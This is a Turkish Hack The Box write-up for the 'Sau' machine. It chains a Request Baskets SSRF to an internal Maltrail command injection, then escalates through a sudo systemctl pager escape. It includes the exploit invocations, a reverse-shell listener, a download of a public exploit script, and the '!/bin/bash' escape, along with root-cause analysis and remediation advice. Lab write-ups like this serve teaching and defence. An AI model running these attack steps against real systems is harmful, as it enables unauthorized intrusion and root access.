# HTB Sau — Writeup

**Zorluk:** Easy
**OS:** Linux (Ubuntu)
**Hedef IP:** 10.129.229.26

---

#### About

`Sau` is an Easy Difficulty Linux machine that features a `Request Baskets` instance that is vulnerable to Server-Side Request Forgery (SSRF) via [`CVE-2023-27163`](https://nvd.nist.gov/vuln/detail/CVE-2023-27163). Leveraging the vulnerability we are able to gain access to a `Maltrail` instance that is vulnerable to Unauthenticated OS Command Injection, which allows us to gain a reverse shell on the machine as `puma`. A `sudo` misconfiguration is then exploited to gain a `root` shell.

---

## 1. Genel Bakış

Sau, HTB'nin "easy" seviye Linux kutularından biri ama zafiyet zinciri gerçekten öğretici: üç farklı sınıftan zafiyeti art arda zincirlemek gerekiyor.

1. **Request Baskets 1.2.1** üzerindeki bir **SSRF** zafiyeti (CVE-2023-27163) — dışarıdan doğrudan erişilemeyen (filtrelenmiş) portlara, hedef sunucunun kendi ağ bağlamından istek attırarak ulaşma.
2. Bu SSRF ile keşfedilen **Maltrail 0.53** servisindeki **kimlik doğrulama gerektirmeyen OS command injection** zafiyeti — doğrudan reverse shell.
3. `sudo -l` ile ortaya çıkan bir **pager escape** zafiyeti — `systemctl status` çıktısının `less` üzerinden sayfalanması istismar edilerek root shell.

Kısacası: **SSRF → filtrelenmiş port keşfi → unauthenticated RCE → sudo pager escape → root**.

---

## 2. Keşif

```
nmap -sS -A -T5 -p- 10.129.229.26
```

| Port | Servis | Durum |
|------|--------|-------|
| 22 | SSH (OpenSSH 8.2p1, Ubuntu) | open |
| 80 | HTTP | **filtered** |
| 8338 | unknown | **filtered** |
| 55555 | HTTP (Golang net/http server) | open |

Buradaki ilk dikkat çekici nokta şu: **80 ve 8338 portları filtrelenmiş** durumda, yani dışarıdan doğrudan erişilemiyor — muhtemelen bir firewall kuralı ya da sadece localhost'a bind edilmiş servisler. Açık olan tek web portu **55555**. Bu port, nmap'in servis parmak izinde `Request Baskets` başlığıyla ve bir Golang HTTP sunucusu olarak tanımlanmış.

---

## 3. Request Baskets Uygulamasına İlk Bakış

`http://10.129.229.26:55555/` adresine gittiğimde otomatik olarak `/web` yoluna yönlendirildim. Karşıma çıkan arayüz, kendini şöyle tanıtıyordu:

> New Basket — Create a basket to collect and inspect HTTP requests

Yani bu araç, kullanıcının oluşturduğu bir "basket" (sepet) üzerinden gelen HTTP isteklerini toplayıp inceleyebildiği bir servis — genelde webhook test etmek, API isteklerini debug etmek için kullanılan meşru bir araç. Bir basket oluşturduğumda bana şunu döndü:

```
Basket 'a6a94wh' is successfully created!
Your token is: ==Wb0JTihvq4gtpbYl5KO-zaylcX_MuI3_tou88ze59jAl==
```

Ve panelde önceden oluşturulmuş başka basket'lar da listeleniyordu:

```
My Baskets:
- 4rso3ih
- fcgv86j
- a6a94wh
```

Sayfanın alt köşesinde yazılım bilgisini gördüm:

> Powered by [request-baskets](https://github.com/darklynx/request-baskets) | Version: 1.2.1

Sürüm numarasını gördüğüm anda ilk işim onu araştırmak oldu — `request-baskets 1.2.1 exploit` şeklinde arattığımda karşıma **CVE-2023-27163** çıktı.

---

## 4. Zafiyet Analizi — CVE-2023-27163 (Request Baskets SSRF)

### 4.1 Request Baskets Ne Yapar, Zafiyet Nerede?

Request Baskets'in temel özelliği, bir basket oluşturulduğunda bu basket'a **isteğe bağlı bir "forward URL" (proxy hedefi)** atanabilmesidir. Yani basket'a gelen her HTTP isteği hem kaydedilir hem de (eğer forward URL tanımlıysa) sunucunun kendisi tarafından, **sunucunun bulunduğu ağ bağlamından**, o hedef URL'ye yeniden gönderilir.

CVE-2023-27163'ün özü şu: uygulama, kullanıcının basket'a atadığı bu **forward/proxy URL değerini yeterince doğrulamıyor**. Yani teorik olarak sadece dış dünyadaki bir webhook'a yönlendirme yapması beklenen bu alana, saldırgan **kendi seçtiği herhangi bir adresi** (localhost, iç ağdaki başka bir servis, hatta cloud metadata endpoint'i gibi hassas adresler) yazabiliyor. Sunucu bu isteği kendi adına, kendi ağından attığı için, normalde dışarıdan erişilemeyen (localhost'a bind edilmiş ya da firewall arkasında olan) servislere **sunucunun içinden** ulaşılabiliyor. Bu, klasik bir **SSRF (Server-Side Request Forgery)** — "sunucuyu kendi adına, benim istediğim yere istek atmaya zorlamak".

### 4.2 Pratikte İstismar

Bu zafiyeti otomatikleştiren bir PoC buldum: [rvzsec/CVE-2023-27163](https://github.com/rvzsec/CVE-2023-27163). Script'in mantığı basit: yeni bir basket oluşturuyor, forward URL'ini saldırganın verdiği hedefe ayarlıyor, sonra o basket'ın public endpoint'ine bir istek atarak sunucunun bu isteği hedefe forward etmesini tetikliyor ve dönen cevabı bize gösteriyor.

Önce kendi makinemde basit bir HTTP sunucu ile testi doğruladım:

```
./exploit.sh http://10.129.229.26:55555/ http://10.10.14.187:8000/
```

Script bir basket oluşturdu (`22469b`), token aldı, sonra basket'ın public path'ine (`GET /22469b`) istek attı. Karşılığında **kendi makinemdeki dizin listesini** (Kali'deki `~/` altı) HTML olarak geri aldım — yani hedef sunucu, benim verdiğim adrese gerçekten kendisi istek atmış ve cevabı bana proxy'lemiş. SSRF doğrulandı.

---

## 5. SSRF ile Filtrelenmiş Portların Keşfi

SSRF'in çalıştığını doğruladıktan sonra asıl amacım nmap'in "filtered" olarak işaretlediği **80** ve **8338** portlarına, hedef sunucunun kendi bakış açısından (yani `127.0.0.1` üzerinden) ulaşmaktı — çünkü bu portlar dışarıdan filtrelenmiş olsa bile, sunucunun **kendi localhost'undan** bu portlara erişimi muhtemelen açıktı.

```
./exploit.sh http://10.129.229.26:55555/ http://127.0.0.1:80/
```

Yeni bir basket (`b15f82`) oluşturuldu, forward hedefi `127.0.0.1:80` olarak ayarlandı. Basket'ın public endpoint'ine istek attığımda karşılığında gelen response header'larında şunu gördüm:

```
Server: Maltrail/0.53
```

Yani **80 numaralı, dışarıya kapalı port**, sunucunun kendi içinde çalışan **Maltrail 0.53** adlı bir servise ait. SSRF sayesinde, normalde göremeyeceğim bu servisin varlığını ve tam sürüm bilgisini öğrenmiş oldum — bu bilgi tek başına bile ciddi bir keşif (information disclosure), çünkü Maltrail'in kendisi de ayrı bir saldırı yüzeyi.

---

## 6. Zafiyet Analizi — Maltrail 0.53 Unauthenticated RCE

Maltrail, ağ trafiğini analiz edip kötü amaçlı (malicious) trafik izlerini (trail) tespit etmeye yarayan açık kaynaklı bir güvenlik izleme aracı. Sürüm 0.53'ü araştırdığımda **kimlik doğrulama gerektirmeyen bir OS command injection** zafiyetinin bilindiğini gördüm — hazır bir exploit de mevcuttu: [spookier/Maltrail-v0.53-Exploit](https://github.com/spookier/Maltrail-v0.53-Exploit).

### 6.1 Zafiyetin Kökeni

Maltrail'in login mekanizması, gelen kullanıcı adı (`username`) parametresini, başarısız girişleri loglamak/işlemek amacıyla arka planda bir sistem komutuna dahil ediyor — ve bu değer **komut satırına aktarılmadan önce temizlenmiyor (sanitize edilmiyor)**. Yani `username` alanına, işletim sistemi komut ayracı karakterleri (`;`, `` ` ``, `$()` gibi) içeren bir payload gönderildiğinde, bu karakterler shell tarafından yorumlanıp **saldırganın kendi komutu** sunucu üzerinde çalıştırılabiliyor. En kritik nokta: bu endpoint **login öncesi**, yani hiçbir kimlik doğrulama gerektirmeden erişilebilir durumda — bu yüzden "unauthenticated RCE".

### 6.2 Pratikte İstismar

Exploit script'ini indirdim:

```
wget https://raw.githubusercontent.com/spookier/Maltrail-v0.53-Exploit/main/exploit.py
```

Ancak burada bir incelik var: Maltrail port 80'de çalışıyor ve **dışarıdan doğrudan erişilemiyor** (filtered). Exploit'in hedefe ulaşabilmesi için, isteklerin yine SSRF açığı olan Request Baskets üzerinden proxy'lenmesi gerekiyor. Bu yüzden hedef URL olarak Maltrail'in kendi adresini değil, **onu 80 portuna forward eden basket'ın adresini** verdim:

```
python3 exploit.py 10.10.14.187 4444 http://10.129.229.26:55555/b15f82
```

Script çalışırken şu satırı bastı:

```
Running exploit on http://10.129.229.26:55555/07200f/login
```

Yani exploit, kendi payload'ını doğrudan Maltrail'in `/login` endpoint'ine değil, **basket'ın proxy'lediği path üzerinden** gönderiyor — istek önce Request Baskets'e gidiyor, oradan SSRF ile Maltrail'e forward ediliyor, komut orada çalışıyor ve tetiklenen reverse shell doğrudan bana bağlanıyor.

Bunu çalıştırmadan önce kendi makinemde listener'ı hazırladım:

```
rlwrap nc -nvlp 4444
```

Exploit'i çalıştırdıktan kısa süre sonra bağlantı geldi:

```
listening on [any] 4444 ...
connect to [10.10.14.187] from (UNKNOWN) [10.129.229.26] 34452
$ whoami
puma
```

`puma` kullanıcısı olarak bir shell elde ettim — bu, Maltrail servisinin çalıştığı kullanıcı hesabı.

---

## 7. Privilege Escalation — Sudo Pager Escape (`systemctl status`)

### 7.1 Keşif

```
$ id
uid=1001(puma) gid=1001(puma) groups=1001(puma)

$ sudo -l
User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

`puma` kullanıcısı, şifresiz olarak **sadece** `systemctl status trail.service` komutunu root yetkisiyle çalıştırabiliyor. İlk bakışta zararsız görünüyor — sonuçta sadece bir servisin durumunu okumaya izin veriyor gibi duruyor. Ama burada klasik ve çok bilinen bir **pager escape** zafiyeti var.

### 7.2 Neden Bu Bir Zafiyet? Pager Escape Mantığı

`systemctl status` komutunun çıktısı, eğer terminal etkileşimliyse ve çıktı ekrana sığmayacak kadar uzunsa, sistem varsayılan olarak çıktıyı bir **pager** (genelde `less`) üzerinden gösterir — tıpkı `man` komutunun ya da `git log`'un çıktısını sayfalandırdığı gibi. Bu, `systemctl`'e özgü bir davranış değil; Linux'ta pager kullanan hemen her araçta (man, less, more, journalctl, git log/diff, systemctl status) aynı prensip geçerlidir.

`less` (ve türevleri), sadece bir "görüntüleyici" değil, aslında **içinde komut çalıştırma yeteneği olan interaktif bir programdır**. `less` çalışırken `!` tuşuna basıp ardından bir komut yazarsanız, `less` o komutu **kendi sürecinin sahip olduğu yetkiyle** bir shell üzerinden çalıştırır. Normal şartlarda bu zararsız bir kullanıcı kolaylığıdır (log okurken hızlıca bir komut çalıştırmak için). Ama komutu tetikleyen program `sudo` ile, yani **root yetkisiyle** başlatılmışsa, `less`'in içinden `!`  ile açılan shell de **root yetkisiyle** çalışır — çünkü `less`, `sudo systemctl status`'un bir alt süreci olarak, zaten root olarak başlamıştır.

Yani zafiyetin özü: **`sudoers` dosyası sadece `systemctl status trail.service` komutunun kendisine izin veriyor gibi görünse de, bu komutun tetiklediği pager (`less`), kendi içinde tamamen ayrı ve kontrolsüz bir komut çalıştırma kapısı açıyor.** `sudo`, `systemctl`'i çalıştırdıktan sonra onun çağırdığı alt programları ayrıca denetlemez.

### 7.3 Pratikte İstismar

```
$ sudo systemctl status trail.service
```

Çıktı `less` pager'ı üzerinden açıldı:

```
WARNING: terminal is not fully functional
-- (press RETURN)
```

RETURN'e bastıktan sonra `less` arayüzü aktif hale geldi. Bu noktada `!` karakterine basıp ardından bir shell komutu yazdım:

```
!/bin/bash
```

Bu, `less`'e "bu komutu bir shell üzerinden çalıştır" dedirtti. `less` zaten `sudo` altında (root olarak) çalıştığı için, açılan `/bin/bash` da **doğrudan root yetkisiyle** başladı:

```
root@sau:/opt/maltrail#
```

Root shell elde edildi.

---

## 8. Sonuç

`puma` kullanıcısının `user.txt` flag'i ile `root` kullanıcısının `root.txt` flag'i, standart konumlarından (`/home/puma/user.txt` ve `/root/root.txt`) okunarak kutu tamamlandı.

---

## 9. Kök Neden Analizi

| Bulgu | Kök Neden | Etki |
|-------|-----------|------|
| CVE-2023-27163 (Request Baskets SSRF) | Basket'a atanan forward/proxy URL'inin doğrulanmadan (whitelist/blacklist kontrolü olmadan) kullanılması | Sunucunun kendi ağ bağlamından keyfi adreslere istek attırılabilmesi, filtrelenmiş portların keşfi |
| Maltrail 0.53 unauthenticated command injection | Login akışındaki `username` parametresinin komut satırına sanitize edilmeden aktarılması | Kimlik doğrulama gerekmeden doğrudan RCE |
| Sudo pager escape (`systemctl status`) | `sudoers` yapılandırmasının, komutun tetiklediği alt programları (pager) hesaba katmaması | Sınırlı görünen bir sudo izninden doğrudan root shell'e çıkılması |

**Düzeltme önerileri (remediation):**

1. Request Baskets **son sürüme** güncellenmeli; CVE-2023-27163 sonrasında forward URL doğrulaması eklenen sürümler tercih edilmeli.
2. Dışarıya açık olmayan servisler (Maltrail gibi) yalnızca ihtiyaç duyulan ağ segmentlerine bağlanmalı; SSRF'e karşı ek önlem olarak uygulama seviyesinde de private/loopback IP aralıklarına giden proxy istekleri reddedilmeli.
3. Maltrail **güncel bir sürüme** yükseltilmeli — bilinen command injection zafiyeti yamalanmış sürümler kullanılmalı.
4. `sudoers` yapılandırmasında pager kullanan komutlara (systemctl status, journalctl, git log/diff, man vb.) izin verilecekse, `SYSTEMD_PAGER=cat` gibi ortam değişkenleriyle pager devre dışı bırakılmalı ya da komutlar `--no-pager` bayrağıyla sabitlenmeli.
5. Genel ilke: `sudo` ile verilen her izin, sadece komutun kendisini değil, **o komutun tetikleyebileceği tüm alt süreçleri** (editör, pager, shell açma potansiyeli olan her şey) göz önünde bulundurarak değerlendirilmeli — bu tür kaçışlar GTFOBins üzerinde geniş çapta dokümante edilmiştir.

---

## 10. Zaman Çizelgesi (Timeline)

1. Nmap taraması → 22 (SSH) açık, 80 ve 8338 filtrelenmiş, 55555'te Request Baskets tespiti
2. Web arayüzünde sürüm bilgisi (`1.2.1`) görüldü, CVE-2023-27163 araştırıldı ve PoC bulundu
3. SSRF doğrulandı — basket, saldırganın kendi HTTP sunucusuna başarıyla forward istek attı
4. SSRF, filtrelenmiş 80 portuna yönlendirilerek arkasında **Maltrail 0.53** servisinin çalıştığı keşfedildi
5. Maltrail 0.53 için bilinen unauthenticated command injection PoC'u bulundu
6. Exploit, hedef olarak doğrudan Maltrail değil, onu proxy'leyen Request Baskets adresi verilerek SSRF üzerinden tetiklendi
7. Reverse shell alındı → `puma` kullanıcısı
8. `sudo -l` ile `systemctl status trail.service` üzerinde NOPASSWD izni tespit edildi
9. `less` pager escape tekniğiyle (`!/bin/bash`) root shell elde edildi
10. Kutu tamamlandı

---

*Bu writeup eğitim ve kişisel referans amaçlıdır; HTB kullanım şartlarına uygun şekilde, yalnızca izinli/yasal lab ortamı olan Hack The Box üzerinde gerçekleştirilmiştir.*
